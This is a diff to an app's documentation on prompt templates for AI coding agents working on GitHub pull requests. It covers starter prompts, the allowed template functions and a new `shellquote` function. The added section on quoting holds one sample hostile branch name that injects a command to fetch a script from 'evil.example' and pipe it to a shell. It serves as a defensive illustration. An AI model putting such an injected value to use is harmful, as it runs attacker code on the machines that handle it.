@@ -3098,8 +3098,11 @@ characters (the short label the launch button and menu show, such as "Review"), 
 blockers only, set to Sonnet at low effort without a worktree), **Fix checks** (find and fix
 a pull request's failing checks, then push the fix), and **Fix dep security** (fix the failing
 security checks on a bot's dependency update: move the vulnerable dependency to a version that
-fixes it, never silence a scanner, and push with one exact `git push`, never forced). A
-starter new in a later version is added to your library once, as these were. Review and Work
+fixes it, never silence a scanner, and push with one exact `git push` to the pull request's
+own branch, named by its full ref and quoted, never forced; for a fork's pull request, or
+another outside contributor's, it commits the fix but pushes nothing). A
+starter new in a later version is added to your library once, as these were, and a starter
+you never changed takes the new text when a later version changes it. Review and Work
 on it are the app's first
 defaults for pull requests and issues. From then on every prompt is yours to change, duplicate,
 or delete; a deleted starter is not added back. **Reset to original** restores a changed
@@ -3141,11 +3144,19 @@ An item's description and comments are deliberately not variables: the agent rea
 of plain text: control characters become spaces and bidirectional controls are removed.
 
 A prompt can use `{{if}}`, `{{else}}`, `{{with}}`, comments, trim markers (`{{- -}}`), and
-the functions `and`, `or`, `not`, `eq`, `ne`, `lt`, `le`, `gt`, `ge`, `len`, `print`, and
-`printf` (widths up to 999, and no value longer than a whole prompt may be). `{{range}}`,
-`{{define}}`, `{{block}}`, and `{{template}}` are refused, so filling in a prompt always
-finishes quickly. When a prompt is sent, trailing spaces are trimmed and runs
-of blank lines collapse to one.
+the functions `and`, `or`, `not`, `eq`, `ne`, `lt`, `le`, `gt`, `ge`, `len`, `print`,
+`printf` (widths up to 999, and no value longer than a whole prompt may be), and
+`shellquote`. `{{range}}`, `{{define}}`, `{{block}}`, and `{{template}}` are refused, so
+filling in a prompt always finishes quickly. When a prompt is sent, trailing spaces are
+trimmed and runs of blank lines collapse to one.
+
+**Values in commands.** A branch, a title, or a label is whatever its author typed, and git
+takes a branch named `x;$(curl${IFS}evil.example|sh)`. Put such a value into a command the agent
+should run through `shellquote`, as in `` `git checkout {{shellquote .Branch}}` ``: it writes
+the value as one word, as it is when every shell reads it as itself, or else in single quotes,
+so the shell never runs any of it. A number needs no quoting, nor do `.Repo`, `.Owner`, and
+`.RepoName`, which GitHub keeps to letters, digits, and `-_.`, nor `.HeadCommit`, which is
+hex.
 
 **Checking.** Every edit is checked as you type, by the same Go template package that fills
 the prompt in at launch. Each problem is listed under the editor with its line and column and
